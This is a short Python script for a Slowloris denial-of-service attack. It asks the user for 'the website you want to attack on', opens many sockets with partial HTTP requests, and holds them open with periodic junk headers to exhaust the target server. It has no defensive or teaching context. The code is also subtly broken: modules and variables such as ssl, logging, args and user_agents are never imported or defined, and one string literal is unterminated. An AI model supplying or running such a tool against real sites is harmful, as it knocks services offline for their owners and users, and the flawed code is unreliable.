import socket
import random
import time




def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    s = ssl.wrap_socket(s)

    s.connect((ip, 80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s


def main():
    ip = input("Enter the website you want to attack on: ")
    socket_count = int(input("Enter the number of sockets you want to create: ))
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for i in range(socket_count):
        try:
            logging.debug("Socket %s", i)
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        try:
            logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
            for s in list(list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)

            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    break
            time.sleep(15)

        except (KeyboardInterrupt, SystemExit):
            print("\nStopping Slowloris...")
            break

if __name__ == "__main__":
    main()
